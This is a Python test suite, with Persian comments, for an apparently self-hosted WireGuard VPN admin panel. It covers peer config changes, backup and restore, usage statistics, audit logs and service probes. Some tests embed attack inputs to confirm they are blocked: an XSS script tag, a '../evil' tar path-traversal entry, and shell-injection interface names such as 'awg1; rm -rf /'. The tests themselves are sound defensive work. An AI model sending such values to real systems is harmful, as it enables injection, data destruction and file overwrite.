        self.assertEqual(m._run_calls, [])

    def test_apply_conf_delta_clears_keepalive_and_allowed_ips(self):
        """حذفِ PersistentKeepalive یا خالی‌کردنِ AllowedIPs باید به کرنل برسد.

        `if keepalive:` و `if allowed:` مقدارِ خالی را دور می‌انداختند و
        کرنل مقدارِ کهنه را تا ری‌استارتِ wg-quick نگه می‌داشت.
        """
        m = self.m
        old = {"A": ("10.0.0.2/32", "", 25)}
        new = {"A": ("", "", 0)}
        del m._run_calls[:]
        m.apply_conf_delta("wgtest", old, new)
        a = self._set_calls_for("A")[0]
        self.assertEqual(a[a.index("persistent-keepalive") + 1], "0")
        self.assertEqual(a[a.index("allowed-ips") + 1], "")
        # None یعنی دست نزن
        del m._run_calls[:]
        m._wg_set_peer("wgtest", "Z", psk="")
        z = self._set_calls_for("Z")[0]
        self.assertNotIn("allowed-ips", z)
        self.assertNotIn("persistent-keepalive", z)

    def test_parse_client_overrides_validation(self):
        f = self.m.parse_client_overrides
        self.assertEqual(f({})[0]["c_mtu"], None)
        self.assertIsNotNone(f({"c_mtu": "99"})[1])      # زیر حداقل
        self.assertIsNotNone(f({"c_mtu": "2000"})[1])    # بالای سقف
        self.assertIsNotNone(f({"c_dns": "notip"})[1])
        self.assertIsNotNone(f({"c_allowed": "bad!!"})[1])
        self.assertIsNotNone(f({"c_keepalive": "-1"})[1])
        good, err = f({"c_mtu": "1380", "c_dns": "1.1.1.1, 8.8.8.8",
                       "c_allowed": "10.0.0.0/8, 192.168.0.0/16",
                       "c_keepalive": "25"})
        self.assertIsNone(err)
        self.assertEqual(good["c_mtu"], 1380)

    def test_bulk_add_cap_and_naming(self):
        m = self.m
        res, err = m.bulk_add_peers("wgtest", "b-", 1, 4, use_psk=False)
        self.assertIsNone(err)
        self.assertEqual(res["created"], ["b-1", "b-2", "b-3", "b-4"])
        self.assertIsNotNone(m.bulk_add_peers("wgtest", "x", 1, 51)[1])
        self.assertIsNotNone(m.bulk_add_peers("wgtest", "بد", 1, 2)[1])

    def test_ping_target_ssrf_guard(self):
        m = self.m
        # user02 در فیکسچر IP 192.168.188.20 دارد (داخل رنج)
        self.assertEqual(m._peer_target_ip("wgtest", "user02"), "192.168.188.20")
        self.assertIsNone(m._peer_target_ip("wgtest", "ghost"))
        ok, out = m.peer_ping("wgtest", "user02")
        self.assertTrue(ok)
        self.assertIn("192.168.188.20", out)

    def test_share_lifecycle(self):
        m = self.m
        m.add_peer("wgtest", "shareme", use_psk=False)
        tok, err = m.create_share("wgtest", "shareme", 30, True, "admin")
        self.assertIsNone(err)
        r = m.resolve_share(tok)
        self.assertTrue(r and r["name"] == "shareme")
        self.assertIsNone(m.resolve_share(tok))          # یک‌بارمصرف
        self.assertIsNotNone(m.create_share("wgtest", "shareme", 9999, True, "a")[1])
        self.assertIsNotNone(m.create_share("wgtest", "nope", 30, True, "a")[1])
        # صفحه‌ی اشتراک: بدونِ usage (سازگارِ عقب‌رو) و با usage
        html = m.render_share_page(r)
        self.assertIn("usage-sec", html)
        self.assertIn('"usage": null', html)
        usage = {"rows": [{"t": "2026-07-20", "rx": 10, "tx": 5}],
                 "month": 15, "quota_gb": 2}
        html = m.render_share_page(r, usage)
        self.assertIn('"quota_gb": 2', html)
        self.assertIn("مصرف اینترنت شما", html)
        # تزریق‌ناپذیری: تگ در داده‌ی usage باید escape شود
        evil = {"rows": [{"t": "</script><script>alert(1)", "rx": 1, "tx": 0}],
                "month": 0, "quota_gb": 0}
        html = m.render_share_page(r, evil)
        self.assertNotIn("</script><script>alert(1)", html)

    def test_backup_restore_roundtrip_and_traversal(self):
        m = self.m
        raw = m.backup_archive_bytes()
        self.assertGreater(len(raw), 0)
        orig = self.read_conf()
        with open(os.path.join(self.tmp, "wgtest.conf"), "w") as f:
            f.write("CORRUPTED")
        ok, _ = m.restore_from_tar(raw)
        self.assertTrue(ok)
        self.assertEqual(self.read_conf().rstrip("\n"), orig.rstrip("\n"))
        # اسنپ‌شاتِ pre-restore باید در tmp بیفتد، نه در BASE_DIR واقعیِ مخزن
        snaps = os.listdir(os.path.join(self.tmp, "restore-backups"))
        self.assertTrue(any(s.startswith("pre-restore-") for s in snaps))
        # path traversal رد شود
        import io as _io
        import tarfile as _tf
        bad = _io.BytesIO()
        with _tf.open(fileobj=bad, mode="w:gz") as t:
            d = b"x"
            info = _tf.TarInfo("../evil")
            info.size = len(d)
            t.addfile(info, _io.BytesIO(d))
        self.assertFalse(m.restore_from_tar(bad.getvalue())[0])

    def _tar_with_conf(self, conf_text):
        import io as _io
        import tarfile as _tf
        buf = _io.BytesIO()
        with _tf.open(fileobj=buf, mode="w:gz") as t:
            d = conf_text.encode()
            info = _tf.TarInfo("wgtest.conf")
            info.size = len(d)
            t.addfile(info, _io.BytesIO(d))
        return buf.getvalue()

    # فیکسچر: user02 فعال، user01/user03 غیرفعال. آرشیو: user02 غیرفعال،
    # user01 فعال با PSK و keepalive.
    RESTORE_CONF = FIXTURE_CONF.replace(
        "#!!!user01\n#[Peer]\n#PublicKey = PUB_USER01_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=\n"
        "#AllowedIPs = 192.168.188.14/32\n",
        "#!!!user01\n[Peer]\nPublicKey = PUB_USER01_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=\n"
        "PresharedKey = RESTORED_PSK=\nAllowedIPs = 192.168.188.14/32\n"
        "PersistentKeepalive = 25\n"
    ).replace(
        "#!!!user02\n[Peer]\nPublicKey = PUB_USER02_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=\n"
        "AllowedIPs = 192.168.188.20/32,149.154.166.110\n",
        "#!!!user02\n#[Peer]\n#PublicKey = PUB_USER02_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=\n"
        "#AllowedIPs = 192.168.188.20/32,149.154.166.110\n")

    def test_restore_applies_the_restored_conf_to_the_live_interface(self):
        """🪤 پیش از این بازیابی فقط WATCHER.resync() می‌زد: peerِ حذف‌شده در
        بکاپ وصل می‌ماند و peerِ برگشته کار نمی‌کرد — و ناظر هم دیگر هرگز
        آن‌ها را همگام نمی‌کرد، چون فایلِ تازه «اعمال‌شده» ثبت شده بود."""
        m = self.m
        self.assertNotEqual(self.RESTORE_CONF, FIXTURE_CONF)
        resynced = []
        m.WATCHER = types.SimpleNamespace(resync=lambda: resynced.append(1))
        seen = []
        orig = m.run

        def spy(cmd, timeout=20):
            if "preshared-key" in cmd:
                with open(cmd[cmd.index("preshared-key") + 1], "rb") as f:
                    seen.append(f.read())
            return orig(cmd, timeout)
        m.run = spy
        del m._run_calls[:]
        ok, msg = m.restore_from_tar(self._tar_with_conf(self.RESTORE_CONF))
        self.assertTrue(ok, msg)
        sets = [c for c in m._run_calls if c[:2] == ["wg", "set"]]
        pub1 = "PUB_USER01_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx="
        pub2 = "PUB_USER02_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx="
        self.assertIn(["wg", "set", "wgtest", "peer", pub2, "remove"], sets)
        add = next(c for c in sets if c[4] == pub1)
        self.assertIn("preshared-key", add)
        self.assertEqual(add[add.index("allowed-ips") + 1], "192.168.188.14/32")
        self.assertEqual(add[add.index("persistent-keepalive") + 1], "25")
        self.assertEqual(seen, [b"RESTORED_PSK=\n"])
        self.assertEqual(len(sets), 2)
        self.assertEqual(resynced, [1])
        # فایل هم واقعاً بازیابی شده
        self.assertIn("PresharedKey = RESTORED_PSK=", self.read_conf())
        # ردِ ممیزی با کنشگرِ بازیابی
        rows = m.META.audit_list(category="peer", limit=10)
        self.assertTrue(any(r["actor"] == m.ACTOR_RESTORE for r in rows))

    def test_restore_of_an_identical_conf_touches_nothing_live(self):
        m = self.m
        del m._run_calls[:]
        ok, _ = m.restore_from_tar(self._tar_with_conf(FIXTURE_CONF))
        self.assertTrue(ok)
        self.assertEqual([c for c in m._run_calls if c[:2] == ["wg", "set"]], [])

    def test_restore_on_a_down_interface_only_writes_the_file(self):
        m = self.m
        m.live_interfaces = lambda: []
        del m._run_calls[:]
        ok, _ = m.restore_from_tar(self._tar_with_conf(self.RESTORE_CONF))
        self.assertTrue(ok)
        self.assertEqual([c for c in m._run_calls if c[:2] == ["wg", "set"]], [])
        self.assertIn("PresharedKey = RESTORED_PSK=", self.read_conf())

    def test_restore_writes_under_the_conf_lock(self):
        """یک add_peer هم‌زمان نباید نسخه‌ی کهنه‌اش را روی فایلِ بازیابی‌شده
        بنویسد؛ قفل باید در طولِ نوشتن گرفته باشد."""
        m = self.m
        held = []
        real_replace = m.os.replace

        def spy_replace(src, dst):
            if dst.endswith("wgtest.conf"):
                held.append(m._conf_lock.locked())
            return real_replace(src, dst)
        m.os = types.SimpleNamespace(**{k: getattr(m.os, k) for k in dir(m.os)
                                        if not k.startswith("__")})
        m.os.replace = spy_replace
        ok, _ = m.restore_from_tar(self._tar_with_conf(self.RESTORE_CONF))
        self.assertTrue(ok)
        self.assertEqual(held, [True])

    def test_usage_matrix(self):
        m = self.m
        # 🪤 تاریخ‌ها **نسبی**اند، نه سخت‌کد. با تاریخِ ثابت این تست به‌محضِ
        # عبورِ همان روز از پنجره‌ی ۳۰روزه خودبه‌خود قرمز می‌شد — و چون گاردِ
        # نشتِ شاخه‌ی عمومی (test_publish) اول کلِ مجموعه را می‌زند و روی
        # قرمزی خارج می‌شود، یک تستِ پوسیده آن گارد را هم بی‌صدا خاموش
        # می‌کرد. الگوی درست در test_usage_prev_total ِ همین فایل است.
        from datetime import datetime, timedelta
        now = datetime.now()
        d1 = (now - timedelta(days=2)).strftime("%Y-%m-%d")
        d2 = (now - timedelta(days=1)).strftime("%Y-%m-%d")
        # درج مصرف دو کاربر در دو روز
        m.META.add_usage([
            (d1 + " 10", d1, "wgtest", "PA", 100, 50),
            (d2 + " 10", d2, "wgtest", "PA", 200, 60),
            (d1 + " 10", d1, "wgtest", "PB", 10, 5),
        ])
        mx = m.META.usage_matrix("wgtest", "30d")
        self.assertIn(d1, mx["buckets"])
        self.assertEqual(mx["data"]["PA"][d2], 260)
        # netdev و iface_agg نباید در ماتریس باشند
        m.META.add_usage([(d1 + " 10", d1, "wgtest",
                           m.NETDEV_KEY, 999, 999)])
        mx2 = m.META.usage_matrix("wgtest", "30d")
        self.assertNotIn(m.NETDEV_KEY, mx2["data"])

    def test_usage_prev_total(self):
        m = self.m
        from datetime import datetime, timedelta
        now = datetime.now()
        d_in = (now - timedelta(days=2)).strftime("%Y-%m-%d")      # داخل ۷ روز
        d_prev = (now - timedelta(days=10)).strftime("%Y-%m-%d")   # بازه‌ی قبلِ ۷روزه
        d_old = (now - timedelta(days=20)).strftime("%Y-%m-%d")    # بیرون از هر دو
        m.META.add_usage([
            (d_in + " 10", d_in, "wgtest", "PA", 100, 50),
            (d_prev + " 10", d_prev, "wgtest", "PA", 300, 70),
            (d_old + " 10", d_old, "wgtest", "PA", 999, 999),
        ])
        prev = m.META.usage_prev_total("wgtest", "PA", "7d")
        self.assertEqual((prev["rx"], prev["tx"]), (300, 70))
        # حالتِ تجمیعِ اینترفیس (تونل): جمعِ همه‌ی peerها منهای netdev
        m.META.add_usage([
            (d_prev + " 11", d_prev, "wgtest", "PB", 20, 10),
            (d_prev + " 11", d_prev, "wgtest", m.NETDEV_KEY, 5000, 5000),
        ])
        prev = m.META.usage_prev_total("wgtest", m.IFACE_AGG_KEY, "7d")
        self.assertEqual((prev["rx"], prev["tx"]), (320, 80))
        # بدونِ داده در بازه‌ی قبل → صفر
        prev = m.META.usage_prev_total("wgtest", "NOPE", "24h")
        self.assertEqual((prev["rx"], prev["tx"]), (0, 0))

    def test_ring10_window_and_series(self):
        """رینگِ ۱۰ثانیه‌ای تبِ «۱ ساعت»: تجمیعِ پنجره‌ای و کلیدهای ویژه."""
        m = self.m
        sm = m.Sampler()
        t0 = 1000.0
        key = ("wgtest", "PUBX")
        # نمونه‌ی اول فقط پنجره را باز می‌کند
        sm._ring10_add(key, t0, 100, 10)
        self.assertEqual(sm.ring10_series("wgtest", "PUBX"), [])
        # داخلِ پنجره جمع می‌شود؛ هنوز نقطه‌ای نیست
        sm._ring10_add(key, t0 + 4, 100, 10)
        self.assertEqual(sm.ring10_series("wgtest", "PUBX"), [])
        # عبور از ۱۰ ثانیه → یک نقطه با نرخِ میانگینِ پنجره
        sm._ring10_add(key, t0 + 10, 100, 10)
        rows = sm.ring10_series("wgtest", "PUBX")
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["t"], int((t0 + 10) * 1000))
        self.assertAlmostEqual(rows[0]["rx"], 200 / 10.0, places=1)
        self.assertAlmostEqual(rows[0]["tx"], 20 / 10.0, places=1)
        # کلیدهای ویژه: تجمیعِ تونل و netdev
        sm._ring10_add(("agg", "wg21"), t0, 0, 0)
        sm._ring10_add(("agg", "wg21"), t0 + 12, 1200, 240)
        rows = sm.ring10_series("wg21", m.IFACE_AGG_KEY)
        self.assertEqual(len(rows), 1)
        self.assertAlmostEqual(rows[0]["rx"], 100.0, places=1)
        sm._ring10_add(("net", "eth0"), t0, 0, 0)
        sm._ring10_add(("net", "eth0"), t0 + 10, 500, 0)
        self.assertEqual(len(sm.ring10_series("eth0", m.NETDEV_KEY)), 1)
        # موجودیتِ ناشناخته → خالی
        self.assertEqual(sm.ring10_series("nope", "X"), [])

    def test_report_cfg_validation(self):
        """تنظیماتِ گزارشِ دوره‌ای: پیش‌فرض‌ها و پاک‌سازیِ ورودیِ بد."""
        m = self.m
        m.CONFIG.pop("report", None)
        c = m.report_cfg()
        self.assertEqual((c["mode"], c["time"], c["dow"]),
                         ("off", "10:00", 4))
        m.CONFIG["report"] = {"mode": "hack", "dow": "x"}
        c = m.report_cfg()
        self.assertEqual(c["mode"], "off")
        self.assertEqual(c["dow"], 4)
        m.CONFIG["report"] = {"mode": "weekly", "dow": 12, "time": "07:30"}
        c = m.report_cfg()
        self.assertEqual((c["mode"], c["dow"], c["time"]),
                         ("weekly", 5, "07:30"))
        m.CONFIG.pop("report", None)

    def test_usage_series_hourly_gran(self):
        """gran=hour برای 7d/30d باکتِ ساعتی می‌دهد (نقشه‌ی حرارتی)."""
        m = self.m
        from datetime import datetime, timedelta
        d = (datetime.now() - timedelta(days=1))
        h1 = d.strftime("%Y-%m-%d 08")
        h2 = d.strftime("%Y-%m-%d 21")
        day = d.strftime("%Y-%m-%d")
        m.META.add_usage([
            (h1, day, "wgtest", "PH", 100, 10),
            (h2, day, "wgtest", "PH", 200, 20),
        ])
        rows = m.META.usage_series("wgtest", "PH", "7d", gran="hour")
        self.assertEqual([r["t"] for r in rows], [h1, h2])
        self.assertEqual(rows[1]["rx"], 200)
        # gran نامعتبر/بازه‌ی بدونِ پشتیبانی → همان روزانه
        rows = m.META.usage_series("wgtest", "PH", "7d")
        self.assertEqual([r["t"] for r in rows], [day])
        self.assertEqual(rows[0]["rx"], 300)

    def test_total_cap_parse(self):
        f = self.m._parse_total_action
        self.assertEqual(f({"total_gb": "200"})[0]["total_gb"], 200.0)
        self.assertEqual(f({"total_gb": "200", "enforce_action": "delete"})[0]
                         ["enforce_action"], "delete")
        self.assertEqual(f({"total_gb": "0"})[0]["total_gb"], None)
        self.assertIsNotNone(f({"total_gb": "abc"})[1])
        # اکشن نامعتبر به disable برمی‌گردد
        self.assertEqual(f({"enforce_action": "hack"})[0]["enforce_action"],
                         "disable")

    # ------------------------------------------------- نگهبان مسیر
    def test_route_guard_adds_missing_route(self):
        m = self.m
        calls = m._run_calls
        calls.clear()
        # فقط اینترفیس بالا با subnet تعریف‌شده → «show» خالی → replace
        m.ensure_user_routes()
        shows = [c for c in calls if c[:3] == ["ip", "route", "show"]]
        replaces = [c for c in calls if c[:3] == ["ip", "route", "replace"]]
        self.assertEqual(len(shows), 1)
        self.assertEqual(replaces,
                         [["ip", "route", "replace", "192.168.188.0/24",
                           "dev", "wgtest"]])

    def test_route_guard_skips_existing_and_down(self):
        m = self.m
        real_run = m.run

        def run_with_route(cmd, timeout=20):
            if cmd[:3] == ["ip", "route", "show"]:
                return 0, "192.168.188.0/24 dev wgtest scope link\n", ""
            return real_run(cmd, timeout)

        m.run = run_with_route
        m._run_calls.clear()
        m.ensure_user_routes()
        self.assertFalse([c for c in m._run_calls
                          if c[:3] == ["ip", "route", "replace"]])
        # اینترفیس خاموش → حتی show هم زده نمی‌شود
        m.run = real_run
        m.live_interfaces = lambda: []
        m._run_calls.clear()
        m.ensure_user_routes()
        self.assertFalse([c for c in m._run_calls if c[0] == "ip"])
        m.live_interfaces = lambda: ["wgtest"]

    # ------------------------------------------------- سهمیه و تاریخ
    def test_parse_quota_expires(self):
        f = self.m.parse_quota_expires
        # خالی → هر دو None بدون خطا
        self.assertEqual(f("", ""), (None, None, None))
        self.assertEqual(f(None, None), (None, None, None))
        # سهمیه‌ی معتبر
        q, e, err = f("50", "")
        self.assertEqual((q, e, err), (50.0, None, None))
        # سهمیه‌ی صفر/منفی → None (نامحدود)
        self.assertEqual(f("0", "")[0], None)
        # سهمیه‌ی نامعتبر
        self.assertIsNotNone(f("abc", "")[2])
        # تاریخ معتبر (میلادی)
        self.assertEqual(f("", "2026-09-01"), (None, "2026-09-01", None))
        # تاریخ نامعتبر
        self.assertIsNotNone(f("", "1405-13-40")[2])
        self.assertIsNotNone(f("", "not-a-date")[2])

    # ------------------------------------------------- تاریخچه‌ی تغییرات
    def test_audit_add_list_filter_prune(self):
        m = self.m
        m.META.add_audit("admin", "peer", "افزودن کاربر", "u1 @ wgtest",
                         "IP=192.168.188.10", "1.2.3.4", True)
        m.META.add_audit("operator1", "tunnel", "خاموش‌کردن", "wg21",
                         "تونل خاموش شد", "5.6.7.8", True)
        m.META.add_audit("admin", "auth", "ورود ناموفق", "", "رمز نادرست",
                         "9.9.9.9", False)
        rows = m.META.audit_list()
        self.assertEqual(len(rows), 3)
        self.assertEqual(rows[0]["action"], "ورود ناموفق")  # جدیدترین اول
        # فیلتر دسته
        self.assertEqual(len(m.META.audit_list(category="peer")), 1)
        # فیلتر کاربر
        self.assertEqual(len(m.META.audit_list(actor="operator1")), 1)
        # جستجو
        self.assertEqual(len(m.META.audit_list(q="192.168.188.10")), 1)
        # لیست کاربران
        self.assertEqual(set(m.META.audit_actors()), {"admin", "operator1"})
        # هرس ۶ ماه: رکورد قدیمی حذف، جدید می‌ماند
        con = m.META._connect()
        with con:
            con.execute("INSERT INTO audit(ts,category,action) VALUES(?,?,?)",
                        (m.time.time() - 200 * 86400, "peer", "قدیمی"))
        con.close()
        self.assertEqual(len(m.META.audit_list(limit=2000)), 4)
        m.META.prune()
        self.assertEqual(len(m.META.audit_list(limit=2000)), 3)

    # ---------------------- رویدادهای گراف (نشانگرها/باند قطعی)
    def test_graph_events_peer_tunnel_and_warp(self):
        """رویدادهای گراف کدِ اکشن برمی‌گردانند و رنگشان از همان کد است.

        پیش از این sev با واژه‌های فارسی سنجیده می‌شد، در حالی که audit
        از چهارزبانه‌شدن به بعد کد ذخیره می‌کند — پس همه‌ی فلگ‌ها آبی
        می‌شدند و tooltip کدِ خام نشان می‌داد.
        """
        m = self.m
        now = m.time.time()
        det = m.adet("ui.audit.det.autodisable", why="ui.audit.reason.quota")
        m.META.add_audit("sys:policy", "peer", "peer.disable.auto",
                         "u1 @ wgtest", det, "", True)
        m.META.add_audit("admin", "peer", "peer.enable", "u1 @ wgtest",
                         "", "", True)
        m.META.add_audit("sys:monitor", "tunnel", "tun.monitor.down", "wg21",
                         "systemd: failed", "", False)
        m.META.add_audit("sys:monitor", "tunnel", "tun.monitor.up", "wg21",
                         "systemd: active", "", True)
        m.META.add_audit("admin", "peer", "peer.add", "other @ wgtest",
                         "", "", True)
        # کاربر: فقط رویدادهای خودِ همان peer، مرتب بر اساس زمان
        evs = m.META.graph_events("wgtest", "u1", now - 3600)
        self.assertEqual([e["action"] for e in evs],
                         ["peer.disable.auto", "peer.enable"])
        self.assertEqual([e["sev"] for e in evs], ["bad", "ok"])
        self.assertEqual(evs[0]["detail"], det)
        self.assertEqual(evs[0]["actor"], "sys:policy")
        self.assertEqual(evs[0]["src"], "audit")
        # تونل: category های tunnel/iface با target خودِ اینترفیس
        evs = m.META.graph_events("wg21", "", now - 3600)
        self.assertEqual([e["action"] for e in evs],
                         ["tun.monitor.down", "tun.monitor.up"])
        self.assertEqual([e["sev"] for e in evs], ["bad", "ok"])
        # فیلتر زمانی: بازه‌ی گذشته‌ی دور → خالی
        self.assertEqual(m.META.graph_events("wg21", "", now + 10), [])
        # include_warp: رویدادهای warp_event هم بیایند
        con = m.META._connect()
        with con:
            con.execute("INSERT INTO warp_event(ts,kind,detail) VALUES(?,?,?)",
                        (now, "degrade", "1.2.3.4 → 5.6.7.8"))
        con.close()
        evs = m.META.graph_events("wgwarp", "", now - 3600, include_warp=True)
        self.assertEqual(len(evs), 1)
        self.assertEqual((evs[0]["src"], evs[0]["action"], evs[0]["sev"]),
                         ("warp", "degrade", "bad"))

    def test_graph_event_severity_still_reads_legacy_persian_rows(self):
        """ردیف‌های پیش از چهارزبانه‌شدن متنِ فارسی دارند و باید رنگ بگیرند."""
        m = self.m
        now = m.time.time()
        m.META.add_audit("admin", "peer", "غیرفعال‌سازی", "u1 @ wgtest",
                         "", "", True)
        evs = m.META.graph_events("wgtest", "u1", now - 3600)
        self.assertEqual([e["sev"] for e in evs], ["bad"])

    # ---------------------------------------------------------------- رمزها
    def test_password_hash_and_set(self):
        m = self.m
        user = {"username": "u1", "salt": "", "hash": "", "role": "viewer",
                "totp": ""}
        m.CONFIG["users"] = [user]
        m.CONFIG_PATH = os.path.join(self.tmp, "config.json")
        ok, _ = m.set_user_password(user, "short")
        self.assertFalse(ok)
        ok, _ = m.set_user_password(user, "longenough123")
        self.assertTrue(ok)
        self.assertTrue(m.check_user_password(user, "longenough123"))
        self.assertFalse(m.check_user_password(user, "wrong"))

    # -------------------------------------------- تشخیص مسیر سرویس‌ها (اطلاعاتی)
    def test_svc_services_defaults_and_filter(self):
        m = self.m
        # بدون config → همه‌ی پیش‌فرض‌ها
        self.assertEqual(set(m.svc_services()), set(m.SVC_DEFAULTS))
        # config محدودکننده؛ کلید ناشناخته نادیده گرفته می‌شود
        m.CONFIG["svc_services"] = ["youtube", "x", "bogus"]
        self.assertEqual(set(m.svc_services()), {"youtube", "x"})

    def test_svc_verdict_mapping(self):
        m = self.m
        self.assertEqual(m._verdict(0, 204)[0], "ok")
        self.assertEqual(m._verdict(0, 301)[0], "ok")
        self.assertEqual(m._verdict(0, 451)[0], "geoblock")
        self.assertEqual(m._verdict(0, 403)[0], "blocked")
        self.assertEqual(m._verdict(0, 503)[0], "server")
        self.assertEqual(m._verdict(28, None)[0], "timeout")
        self.assertEqual(m._verdict(6, None)[0], "unreach")
        self.assertEqual(m._verdict(35, None)[0], "tls")

    def test_valid_public_iface_rejects_injection(self):
        m = self.m
        m.iface_meta_all = lambda: {"awg1": {}, "eth0": {}}
        self.assertTrue(m._valid_public_iface("awg1"))
        # نامِ ناموجود رد می‌شود
        self.assertFalse(m._valid_public_iface("awg9"))
        # تلاش تزریق: هم regex هم بررسیِ وجود جلویش را می‌گیرد
        self.assertFalse(m._valid_public_iface("awg1; rm -rf /"))
        self.assertFalse(m._valid_public_iface("../../etc"))

    def test_svc_probe_one_parses_curl_and_binds_iface(self):
        m = self.m
        m.iface_meta_all = lambda: {"awg1": {}}
        m.shutil = types.SimpleNamespace(which=lambda x: "/usr/bin/curl")
        seen = {}

        def fake_run(cmd, timeout=20):
            seen["cmd"] = cmd
            return 0, "204 0.1234", ""
        m.run = fake_run
        res = m.svc_probe_one("youtube", "awg1")
        self.assertTrue(res["ok"])
        self.assertEqual(res["http_code"], 204)
        self.assertEqual(res["latency_ms"], 123.4)
        # حتماً به همان اینترفیس bind شده و URL از تعریفِ سرویس است
        self.assertIn("--interface", seen["cmd"])
        self.assertEqual(seen["cmd"][seen["cmd"].index("--interface") + 1],
                         "awg1")
        self.assertEqual(seen["cmd"][-1], m.SVC_DEFAULTS["youtube"]["probe"])

    def test_svc_probe_one_refuses_bad_iface_without_running_curl(self):
        m = self.m
        m.iface_meta_all = lambda: {"awg1": {}}
        m.shutil = types.SimpleNamespace(which=lambda x: "/usr/bin/curl")
        ran = {"n": 0}

        def fake_run(cmd, timeout=20):
            ran["n"] += 1
            return 0, "", ""
        m.run = fake_run
        res = m.svc_probe_one("youtube", "evil; reboot")
        self.assertEqual(res["verdict"], "badiface")
        self.assertEqual(ran["n"], 0)  # curl هرگز اجرا نشد

    def test_svc_resolve_one_collects_ipv4(self):
        m = self.m
        m.socket = types.SimpleNamespace(
            AF_INET=2, SOCK_STREAM=1, gaierror=Exception,
            getaddrinfo=lambda *a, **k: [
                (2, 1, 6, "", ("142.250.1.1", 443)),
                (2, 1, 6, "", ("142.250.1.2", 443))])
        ips = m.svc_resolve_one("youtube")
        self.assertIn("142.250.1.1", ips)
        self.assertIn("142.250.1.2", ips)

    def test_detect_user_exit_skips_server_local_ip(self):
        m = self.m
        # .1 آدرسِ محلیِ سرور است؛ باید رد شود و مبدأ یک IP کاربر باشد
        m.iface_meta_all = lambda: {"wgtest": {"addresses": ["192.168.188.1"]}}
        used = {}

        def fake_run(cmd, timeout=20):
            if cmd[:3] == ["ip", "route", "get"]:
                used["src"] = cmd[cmd.index("from") + 1]
                return 0, "142.250.185.110 from %s dev awg1 \n" % used["src"], ""
            return 0, "", ""
        m.run = fake_run
        m._exit_cache = {"ts": 0.0, "val": None}
        self.assertEqual(m.detect_user_exit(), "awg1")
        self.assertNotEqual(used["src"], "192.168.188.1")  # آدرس سرور نبود

    def test_is_global_ip_ssrf_guard(self):
        m = self.m
        self.assertTrue(m._is_global_ip("142.250.185.110"))
        self.assertFalse(m._is_global_ip("192.168.188.10"))
        self.assertFalse(m._is_global_ip("127.0.0.1"))
        self.assertFalse(m._is_global_ip("169.254.1.1"))
        self.assertFalse(m._is_global_ip("10.0.0.5"))
        self.assertFalse(m._is_global_ip("not-an-ip"))

    def test_parse_traceroute(self):
        m = self.m
        txt = ("traceroute to 142.251.142.110 (142.251.142.110), 20 hops max\n"
               " 1  * * *\n"
               " 2  87.249.139.253  39.8 ms  40.1 ms  38.2 ms\n"
               " 9  212.156.104.148  58.2 ms  *  60.0 ms\n")
        hops = m._parse_traceroute(txt, 3)
        self.assertEqual(len(hops), 3)
        # هاپ ۱: کاملاً بی‌پاسخ
        self.assertEqual(hops[0]["host"], "???")
        self.assertEqual(hops[0]["loss"], 100.0)
        # هاپ ۲: ۳ پاسخ، میانگین درست
        self.assertEqual(hops[1]["host"], "87.249.139.253")
        self.assertEqual(hops[1]["loss"], 0.0)
        self.assertAlmostEqual(hops[1]["avg"], 39.4, places=1)
        # هاپ ۳: یک بسته گمشده از ۳ → ۳۳٪
        self.assertEqual(hops[2]["loss"], 33.3)

    def test_parse_traceroute_annotations_and_dominant_host(self):
        m = self.m
        out = ("traceroute to 1.2.3.4 (1.2.3.4), 20 hops max\n"
               " 2  10.0.0.1  1.0 ms  10.0.0.2  1.2 ms  10.0.0.1  1.1 ms\n"
               " 3  5.6.7.8  9.9 ms !H\n")
        hops = m._parse_traceroute(out, 3)
        self.assertEqual(len(hops), 2)
        # چند IP در یک هاپ: پرتکرارترین host، بقیه در alt
        self.assertEqual(hops[0]["host"], "10.0.0.1")
        self.assertEqual(hops[0]["alt"], 1)
        # علامتِ !H نباید به‌عنوان host خوانده شود؛ در notes می‌ماند
        self.assertEqual(hops[1]["host"], "5.6.7.8")
        self.assertIn("!H", hops[1]["notes"])

    def test_svc_purge_service_clears_all_rows(self):
        m = self.m
        m.META.svc_resolved_upsert("tidal", {"1.1.1.1"})
        m.META.svc_probe_upsert("tidal", "awg1", True, 5.0, 200, "ok", "")
        m.META.mtr_add("tidal", "awg1", "1.1.1.1", 5, 1, 0, 4.2, True, 3, "[]")
        m.META.svc_purge_service("tidal")
        self.assertNotIn("tidal", m.META.svc_resolved_summary())
        self.assertNotIn(("tidal", "awg1"), m.META.svc_probe_all())
        self.assertEqual(m.META.mtr_history("tidal", "awg1"), [])

    def test_svc_add_custom_validation_and_ssrf_guard(self):
        m = self.m
        m.CONFIG.pop("svc_custom", None)
        orig_gai = m.socket.getaddrinfo
        orig_save = m.save_config
        m.save_config = lambda: None      # بدونِ نوشتنِ فایل در تست
        try:
            # دامنه‌ی نامعتبر (بدون resolve)
            self.assertIsNone(m.svc_add_custom("not a domain", "")[0])
            # IP به‌جای دامنه رد شود
            self.assertIsNone(m.svc_add_custom("10.0.0.1", "")[0])
            # دامنه‌ای که به IP خصوصی resolve می‌شود → رد (ضدِ SSRF)
            m.socket.getaddrinfo = lambda *a, **k: [
                (2, 1, 6, "", ("10.0.0.5", 443))]
            self.assertIsNone(m.svc_add_custom("intra.evil", "")[0])
            # دامنه‌ی معتبرِ عمومی → پذیرفته
            m.socket.getaddrinfo = lambda *a, **k: [
                (2, 1, 6, "", ("72.163.4.185", 443))]
            # برچسب با کوتیشن/تگ رد شود: در رابط داخلِ onclick می‌رود و یک
            # svc.edit نباید متنِ دلخواه به همه‌ی ادمین‌ها برساند
            for bad in ("x');alert(1);//", "<b>x</b>", 'a"b', "a&b",
                        "x\ny", "_x", "a" * 41):
                with self.subTest(label=bad):
                    self.assertEqual(m.svc_add_custom("cisco.com", bad),
                                     (None, "api.err.svc.label_bad"))
            self.assertNotIn("c_cisco_com", m.svc_services())
            key, err = m.svc_add_custom("cisco.com", "سیسکو")
            self.assertIsNone(err)
            self.assertEqual(key, "c_cisco_com")
            self.assertEqual(m.svc_services()["c_cisco_com"]["label"], "سیسکو")
            self.assertIn("c_cisco_com", m.svc_services())
